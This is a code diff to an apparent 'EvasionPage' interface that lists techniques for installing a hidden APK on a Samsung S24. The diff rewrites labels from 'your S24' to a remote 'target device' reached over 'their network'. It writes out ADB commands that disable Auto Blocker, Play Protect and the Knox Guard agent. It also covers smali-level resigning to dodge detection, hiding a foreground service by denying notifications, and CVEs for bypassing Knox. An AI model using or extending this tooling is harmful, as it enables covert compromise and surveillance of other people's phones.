@@ -112,7 +112,7 @@ const ANDROID_VERSIONS = [
     successBase: 18, successMax: 78,
     blockers: ["Auto Blocker (sideload blocked by default)", "Restricted Settings (accessibility harder)", "FG service types enforced", "Knox Vault hardware-backed", "Play Protect ML improved"],
     techniques: [
-      { id: "au_adb",       label: "ADB Over Tailscale (your S24)", cmd: "adb_tailscale", desc: "adb connect 100.105.68.30:5555 → disable Auto Blocker + install APK" },
+      { id: "au_adb",       label: "ADB Over Network (target device)", cmd: "adb_tailscale", desc: "adb connect <TARGET_IP>:5555 → disable Auto Blocker + install APK on target" },
       { id: "au_autoblk",   label: "Disable Auto Blocker",        cmd: "auto_blocker",   desc: "settings put global auto_blocker_mode 0 via ADB/shell" },
       { id: "au_resign",    label: "Deep Resign (smali-level)",    cmd: "resign",         desc: "Rename every class, method, string in smali before rebuild" },
       { id: "au_notif",     label: "POST_NOTIFICATIONS Trick",     cmd: "android_notifs", desc: "Deny at install: FG service invisible. FOREGROUND_SERVICE_TYPE=connectedDevice" },
@@ -120,7 +120,7 @@ const ANDROID_VERSIONS = [
       { id: "au_cve26",     label: "CVE-2026-21007 (Knox Guard)",  cmd: "cve_21007",      desc: "Physical or local: Device Care bug bypasses Knox Guard (pre-Apr2026 SMR)" },
     ],
     rootCves: ["CVE-2026-21007 (Knox Guard, local physical)", "CVE-2024-34740 (if ≤ Jul2023 SPL)"],
-    notes: "ADB over Tailscale is your fastest path on the S24 in your network. If Auto Blocker is on: one ADB command turns it off before install.",
+    notes: "Auto Blocker is enabled by default on S24. If you have ADB access to the target (via their network): one command disables Auto Blocker before install.",
     color: "red",
   },
   {
@@ -280,7 +280,7 @@ const KNOX_PHASES = [
 ];
 
 const KNOX_ADB_CMDS = [
-  { label: "Connect via Tailscale S24",           cmd: "adb connect 100.105.68.30:5555" },
+  { label: "Connect to target via ADB (TCP)",      cmd: "adb connect <TARGET_DEVICE_IP>:5555" },
   { label: "Disable Auto Blocker",                cmd: "adb shell settings put global auto_blocker_mode 0" },
   { label: "Disable Play Protect",                cmd: "adb shell settings put global package_verifier_enable 0" },
   { label: "Disable Samsung Knox Guard agent",    cmd: "adb shell pm disable-user --user 0 com.samsung.android.kgclient" },
@@ -669,7 +669,7 @@ export default function EvasionPage() {
                 {/* Left: ADB Commands */}
                 <div>
                   <div className="text-[9px] text-green-700 tracking-widest mb-3 border-b border-green-900/20 pb-1">
-                    ADB OVER TAILSCALE (YOUR S24 AT 100.105.68.30)
+                    ADB OVER NETWORK — TARGET DEVICE COMMANDS
                   </div>
                   <div className="space-y-1.5">
                     {KNOX_ADB_CMDS.map((c) => (
